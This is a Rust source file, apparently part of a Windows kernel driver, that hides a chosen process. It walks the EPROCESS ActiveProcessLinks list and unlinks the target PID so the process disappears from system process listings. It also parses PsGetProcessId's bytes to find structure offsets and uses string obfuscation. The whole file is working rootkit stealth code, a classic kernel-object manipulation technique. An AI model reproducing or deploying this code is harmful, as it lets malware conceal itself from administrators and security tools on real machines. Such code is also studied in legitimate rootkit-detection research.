use core::{mem::size_of, ptr::addr_of_mut};

use winapi::{shared::ntdef::{LIST_ENTRY, UNICODE_STRING}, km::wdm::PEPROCESS};

use crate::{includes::{PsGetCurrentProcess}, process::get_function_base_address, string::create_unicode_string};



/*
kd> dt nt!_EPROCESS
    +0x000 Pcb              : _KPROCESS
    +0x438 ProcessLock      : _EX_PUSH_LOCK
    +0x440 UniqueProcessId  : Ptr64 Void
    +0x448 ActiveProcessLinks : _LIST_ENTRY
*/

/*
0: kd> u PsGetProcessId
nt!PsGetProcessId:
    fffff800`58e6ab30 488b8140040000  mov     rax,qword ptr [rcx+440h]
*/

/// Get the offset to nt!_EPROCESS.UniqueProcessId
fn get_unique_pid_offset() -> usize {
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("PsGetProcessId\0")
    ) as *mut UNICODE_STRING;

    let base_address = get_function_base_address(unicode_function_name);
    let function_bytes: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 5) };

    let slice = &function_bytes[3..5];
    let unique_pid_offset = u16::from_le_bytes(slice.try_into().unwrap());
    log::info!("EPROCESS.UniqueProcessId: {:#x}", unique_pid_offset);

    return unique_pid_offset as usize;
}

pub fn hide_process(pid: u32) -> Result<bool, &'static str> {
    //nt!_EPROCESS.UniqueProcessId
    let unique_process_id_offset: usize = get_unique_pid_offset();

    //nt!_EPROCESS.ActiveProcessLinks
    let active_process_links_offset: usize = unique_process_id_offset + size_of::<usize>();

    //The PsGetCurrentProcessId routine identifies the current thread's process.
    let mut current_eprocess = unsafe { PsGetCurrentProcess() };

    log::info!("current_eprocess: {:?}", current_eprocess);

    if current_eprocess.is_null() {
        log::info!("Failed to call PsGetCurrentProcess");
        return Err("Failed to call PsGetCurrentProcess");
    }

    //ActiveProcessLinks: hardcoded offset as this has not changed through various version of windows
    let mut current_list = (current_eprocess as usize + active_process_links_offset) as *mut LIST_ENTRY;
    let mut current_pid = (current_eprocess as usize + unique_process_id_offset) as *mut u32;

    // Check if the current process ID is the one to hide
    if unsafe { (*current_pid) == pid } {
        remove_links(current_list);
        return Ok(true);
    }

    // This is the starting position
    let start_process: PEPROCESS = current_eprocess;

    // Iterate over the next EPROCESS structure of a process
    current_eprocess = unsafe { ((*current_list).Flink as usize - active_process_links_offset) as PEPROCESS };
    current_pid = (current_eprocess as usize + unique_process_id_offset) as *mut u32;
    current_list = (current_eprocess as usize + active_process_links_offset) as *mut LIST_ENTRY;

    // Loop until the circle is complete or until the process ID is found
    while start_process as usize != current_eprocess as usize {
        
        // Check if the current process ID is the one to hide
        if unsafe { (*current_pid) == pid } {
            remove_links(current_list);
            return Ok(true);
        }

        // Iterate over the next EPROCESS structure of a process
        current_eprocess = unsafe { ((*current_list).Flink as usize - active_process_links_offset) as PEPROCESS };
        current_pid = (current_eprocess as usize + unique_process_id_offset) as *mut u32;
        current_list = (current_eprocess as usize + active_process_links_offset) as *mut LIST_ENTRY;
    }


    return Ok(true);
}

fn remove_links(current: *mut LIST_ENTRY) {
    let previous = unsafe { (*current).Blink };
    let next = unsafe { (*current).Flink };

    unsafe { (*previous).Flink = next };
    unsafe { (*next).Blink = previous };

    // This will re-write the current LIST_ENTRY to point to itself to avoid BSOD
    unsafe { (*current).Blink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
    unsafe { (*current).Flink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
}